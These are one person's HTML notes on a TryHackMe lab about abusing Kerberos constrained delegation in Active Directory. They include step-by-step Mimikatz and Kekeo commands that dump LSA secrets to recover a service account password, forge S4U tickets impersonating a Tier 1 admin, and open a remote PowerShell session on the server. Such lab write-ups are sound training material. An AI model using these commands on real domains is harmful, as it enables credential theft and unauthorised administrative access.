<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Kerberos Delegation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Kerberos Delegation</h1><br/><p><strong><h1>Exploiting Kerberos Delegation</h1></strong></p><p></p><p>Next, we will take a look at Kerberos Delegation. When you talk about AD Delegation, this is usually what is being discussed, not Permission Delegation. </p><p></p><p><strong><h3>Kerberos Delegation</h3></strong></p><p></p><p>The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.</p><p></p><p>However, we can allow this service account to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.</p><p></p><p><strong><span style="text-decoration:underline;">Constrained vs Unconstrained</span></strong></p><p></p><p>There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method.  In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the &quot;TRUSTED_FOR_DELEGATION&quot; flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. If you want to see an example of the exploitation of Unconstrained Delegation, have a look here.</p><p></p><p>To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. The following are examples of services that can be configured for delegation:</p><p></p><p>    • HTTP - Used for web applications to allow pass-through authentication using AD credentials.</p><p>    • CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.</p><p>    • LDAP - Used to delegate to the LDAP service for actions such as resetting a user&#39;s password.</p><p>    • HOST - Allows delegation of account for all activities on the host.</p><p>    • MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.</p><p></p><p>Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the delegated account can&#39;t just be used for everything. However, it can still be used for some powerful exploitation. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any non-sensitive user account in order to access the service as that user. Imagine impersonating an account with access to a sensitive database, for example.</p><p></p><p><strong><span style="text-decoration:underline;">Resource-Based Constrained Delegation</span></strong></p><p></p><p>So there are actually three types of Kerberos Delegation. But this one deserves to be mentioned on its own. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation <strong>(RBCD) </strong>once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. In our web application example, this means that instead of specifying that the web service account can delegate to the database service to access the database, we can now specify that on the database service that the web service account is allowed to delegate access to it.</p><p></p><p>Let&#39;s say that we have permission to configure RBCD for a service. This means we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. If you want a detailed example of RBCD exploitation, take a look here.</p><p></p><p></p><p><strong><h3>Constrained Delegation Exploitation</h3></strong></p><p></p><p>We will exploit Constrained Delegation for this task. The first thing we need to do is <strong>enumerate available delegations</strong>. Let&#39;s use our new privileged user for the network couple of commands. We can use the <strong>Get-NetUser </strong>cmdlet of PowerSploit for this enumeration by running the following command:</p><p></p><p><strong>Import-Module C:\Tools\PowerView.ps1 </strong></p><p><strong>Get-NetUser -TrustedToAuth</strong></p><p></p><p><img src="images/344-1.png" alt="images/344-1.png" /></p><p></p><p><strong>Note:</strong> We will perform all these operation as <strong>t2_ross.bird</strong> as we need administrator privileges in <strong>THMWRK1</strong> to use Mimikatz properly.</p><p></p><p> Based on the output of this command, we can see that the <strong>svcIIS</strong> account can delegate the <strong>HTTP</strong> and <strong>WSMAN</strong> services on <strong>THMSERVER1</strong>. You would think that this means we can only access websites on behalf of impersonated users. However, <strong>PowerShell Remoting</strong> uses the <strong>HTTP</strong> and <strong>WSMAN</strong> services as well. The ideal option would be to <strong>impersonate</strong> a <strong>Tier 1 Admin</strong> since this would provide us with <strong>administrative access </strong>over <strong>THMSERVER1</strong>.</p><p> </p><p><strong><span style="text-decoration:underline;"> Post Exploitation of Old Task [As Administrator of THMWRK1]</span></strong></p><p> </p><p> We will use mimikatz &amp; dump the LSA secrets to find any credentials. We got Lucky.</p><p> <strong></strong></p><p><strong> privilege::debug</strong></p><p><strong> token:;elevate</strong></p><p><strong> lsadump::secrets</strong></p><p> </p><p>Let&#39;s run through the two commands:</p><p></p><p>    • token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.</p><p>    • lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.</p><p> </p><p> </p><p> <img src="images/344-2.png" alt="images/344-2.png" /></p><p> </p><p><strong> Crdentials Found:</strong></p><p> Username: svcIIS</p><p> Password: Password1@</p><p> </p><p> </p><p> Now that we have access to the password associated with the <strong>svcIIS</strong> account, we can perform a <strong>Kerberos delegation attack</strong>. We will use a combination of <strong>Kekeo</strong> and <strong>Mimikatz</strong>. You can use another window for Mimikatz, but make sure to <strong>exit</strong> out of <strong>Mimikatz</strong> after the<strong> token::elevate</strong> command, otherwise the tickets will be loaded in the wrong context later on. We will use <strong>Kekeo</strong> to <strong>generate</strong> our <strong>tickets</strong> and then use <strong>Mimikatz</strong> to <strong>load</strong> those <strong>tickets</strong> into <strong>memory</strong>. Let&#39;s start by generating the tickets:</p><p> </p><p><img src="images/344-3.png" alt="images/344-3.png" /></p><p> </p><p> We first need to <strong>generate</strong> a <strong>TGT</strong> that can be used to <strong>generate tickets</strong> for the <strong>HTTP</strong> and <strong>WSMAN</strong> services:</p><p> </p><p><img src="images/344-4.png" alt="images/344-4.png" /></p><p> </p><p><strong>tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@ </strong></p><p> </p><p> Parameters explained:</p><p></p><p>    • user - The user who has the constrained delegation permissions.</p><p>    • domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.</p><p>    • password - The password associated with the svcIIS account.</p><p></p><p>Now that we have the <strong>TGT</strong> for the <strong>account</strong> that <strong>can</strong> <strong>perform delegation</strong>, we can <strong>forge</strong> <strong>TGS</strong> <strong>requests</strong> for the <strong>account</strong> we want to <strong>impersonate</strong>. We need to perform this for both <strong>HTTP</strong> and <strong>WSMAN</strong> to allow us to create a <strong>PSSession</strong> on <strong>THMSERVER1</strong>:</p><p></p><p>Lets Find a target account.</p><p></p><p><strong>Get-ADGroupMember -Identity &quot;Tier 1 Admins&quot;</strong></p><p></p><p><img src="images/344-5.png" alt="images/344-5.png" /></p><p></p><p>I selected “<strong>t1_pamela.dunn</strong>” &amp; will forge TGS for this account for the <strong>HTTP</strong> service.</p><p></p><p><strong>tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_pamela.dunn /service:http/THMSERVER1.za.tryhackme.loc</strong></p><p></p><p><img src="images/344-6.png" alt="images/344-6.png" /></p><p> </p><p>  Parameters explained:</p><p></p><p>    • tgt - We provide the TGT that we generated in the previous step.</p><p>    • user - The user we want to impersonate. Since<strong> t2_ accounts</strong> have <strong>administrative</strong> access over <strong>workstations</strong>, it is a safe assumption that <strong>t1_ accounts</strong> will have administrative access over <strong>servers</strong>, so choose a <strong>t1_ account</strong> that you would like to impersonate.</p><p>    • service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.</p><p></p><p>Run the command again, this time for the <strong>WSMAN</strong> service. </p><p></p><p><strong>tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_pamela.dunn /service:wsman/THMSERVER1.za.tryhackme.loc</strong></p><p></p><p><img src="images/344-7.png" alt="images/344-7.png" /></p><p></p><p><strong>Now that we have the two TGS tickets, we can use Mimikatz to import them:</strong></p><p><strong>Mimikatz</strong> </p><p></p><p><img src="images/344-8.png" alt="images/344-8.png" /></p><p></p><p>I started Mimikatz from the same kekeo directory as the files were stored there &amp; i could use direct file names in mimikatz.</p><p></p><p><span style="text-decoration:underline;">Commands:</span></p><p></p><p><strong>privilege::debug</strong></p><p><strong>kerberos::ptt TGS_t1_pamela.dunn@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</strong></p><p><strong>kerberos::ptt TGS_t1_pamela.dunn@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</strong></p><p><strong></strong></p><p></p><p>You can exit Mimikatz and run <strong>klist</strong> if you want to verify that the tickets were imported. Now that the tickets are imported, we can finally create our <strong>PSSession</strong> on <strong>THMSERVER1</strong>:</p><p></p><p><img src="images/344-9.png" alt="images/344-9.png" /></p><p></p><p><strong>klist</strong> shows both the tickets are ready in memory.</p><p></p><p>Finally, Lets start <strong>PSSession</strong></p><p></p><p><strong>New-PSSession -ComputerName thmserver1.za.tryhackme.loc</strong></p><p><strong>Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</strong></p><p></p><p><img src="images/344-10.png" alt="images/344-10.png" /></p><p></p><p>Thus, we successfully accessed the THMSERVER1 as a Tier 1 Admin user.</p><p>Note: Once the 2 Tickets are in memory, instead of using PSSession, we could also use <strong>winrs.exe</strong></p><p></p><p>eg. <strong>winrs.exe -r:THMSERVER1.za.tryhackme.loc cmd</strong></p><p></p></div>
</body>
</html>
